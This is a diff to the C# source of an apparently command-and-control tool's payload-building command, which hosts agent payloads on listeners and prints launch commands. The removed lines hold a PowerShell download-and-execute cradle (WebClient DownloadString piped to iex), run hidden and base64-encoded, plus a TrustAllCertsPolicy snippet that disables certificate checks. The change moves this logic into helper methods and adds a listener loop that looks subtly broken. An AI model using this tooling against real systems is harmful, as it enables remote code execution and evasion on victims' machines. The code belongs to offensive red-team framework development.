@@ -40,7 +40,7 @@ namespace Commander.Commands
     }
     public class BuildPayloadCommand : EnhancedCommand<BuildPayloadCommandOptions>
     {
-        public static string PowershellSSlScript = "add-type 'using System.Net;using System.Security.Cryptography.X509Certificates;public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}';[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy;";
+
 
         public override string Category => CommandCategory.Core;
         public override string Description => "Create a payload file";
@@ -69,7 +69,7 @@ namespace Commander.Commands
 
             var agent = context.Executor.CurrentAgent;
 
-            if(string.IsNullOrEmpty(context.Options.bindTo) && string.IsNullOrEmpty(context.Options.listener))
+            if (string.IsNullOrEmpty(context.Options.bindTo) && string.IsNullOrEmpty(context.Options.listener))
             {
                 context.Terminal.WriteError($"[X] Either an endpoint or a listener should be provided !");
                 return false;
@@ -86,7 +86,7 @@ namespace Commander.Commands
             if (!string.IsNullOrEmpty(context.Options.listener))
             {
                 listener = context.CommModule.GetListeners().FirstOrDefault(l => l.Name.ToLower() == context.Options.listener.ToLower());
-                if(listener == null)
+                if (listener == null)
                 {
                     context.Terminal.WriteError($"[X] Listener {context.Options.listener} not found !");
                     return false;
@@ -115,7 +115,7 @@ namespace Commander.Commands
             }
 
             ConnexionUrl endpoint = null;
-            if(listener != null)
+            if (listener != null)
                 endpoint = ConnexionUrl.FromString(listener.EndPoint);
             else
                 endpoint = ConnexionUrl.FromString(context.Options.bindTo);
@@ -132,7 +132,7 @@ namespace Commander.Commands
                 return false;
             }
 
-            if(!string.IsNullOrEmpty(context.Options.serverKey))
+            if (!string.IsNullOrEmpty(context.Options.serverKey))
                 serverKey = context.Options.serverKey;
 
             if (context.Options.type == "all")
@@ -182,12 +182,16 @@ namespace Commander.Commands
             };
 
             var ret = this.GeneratePayload(context, options);
+            if(string.IsNullOrEmpty(ret))
+            {
+                return false;
+            }
 
             if (!string.IsNullOrEmpty(context.Options.webhost))
             {
                 byte[] fileContent = File.ReadAllBytes(ret);
                 var path = context.Options.webhost;
-                while(path.StartsWith('/'))
+                while (path.StartsWith('/'))
                     path = path.Substring(1);
 
                 if (!string.IsNullOrEmpty(context.Options.webhostAgent))
@@ -197,7 +201,7 @@ namespace Commander.Commands
                 }
                 else
                 {
-                    context.CommModule.WebHost(path, fileContent);
+                    await context.CommModule.WebHost(path, fileContent, options.Type == PayloadType.PowerShell, options.ToString());
 
                     if (options.Type == PayloadType.PowerShell)
                     {
@@ -206,41 +210,26 @@ namespace Commander.Commands
                             listener = context.CommModule.GetListeners().FirstOrDefault(l => l.Name.ToLower() == context.Options.webhostListener.ToLower());
                         }
 
-                        if (listener == null && agent != null && agent.ListenerId != null)
-                        {
-                            listener = context.CommModule.GetListeners().FirstOrDefault(l => l.Id == agent.ListenerId);
-                        }
-
+                        var listeners = context.CommModule.GetListeners();
                         if (listener != null)
+                            listeners = new List<Models.Listener>() { listener };
+
+                        foreach (var list in listeners)
                         {
                             string urlwh = $"{listener.EndPoint}/{path}";
                             context.Terminal.WriteLine($"[*] payload hosted on : {urlwh}");
 
-                            string tmpFile = ShortGuid.NewGuid();
-
-                            string script = null;
-                            switch (options.Type)
-                            {
-                                case PayloadType.PowerShell:
-                                    script = $"(New-Object Net.WebClient).DownloadString('{urlwh}') | iex";
-                                    break;
-                            }
-
-
-                            if (!string.IsNullOrEmpty(script))
-                            {
-                                if (listener.Secured)
-                                    script = PowershellSSlScript + script;
-                                string enc64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));
-                                context.Terminal.WriteLine($"[>] Command : powershell -noP -sta -w 1 -c \"{script}\"");
-                                context.Terminal.WriteLine($"[>] Command : powershell -noP -sta -w 1 -enc {enc64}");
-                            }
+                            var script = WebHostCommand.GeneratePowershellScript(urlwh, listener.Secured);
+                            var scriptb64 = WebHostCommand.GeneratePowershellScriptB64(urlwh, listener.Secured);
+                            context.Terminal.WriteLine($"[>] Command : {script}");
+                            context.Terminal.WriteLine($"[>] Command : {scriptb64}");
                         }
+
                     }
                 }
             }
 
-            return !string.IsNullOrEmpty(ret);
+            return true;
         }
 
         private string GeneratePayload(CommandContext<BuildPayloadCommandOptions> context, PayloadGenerationOptions options)
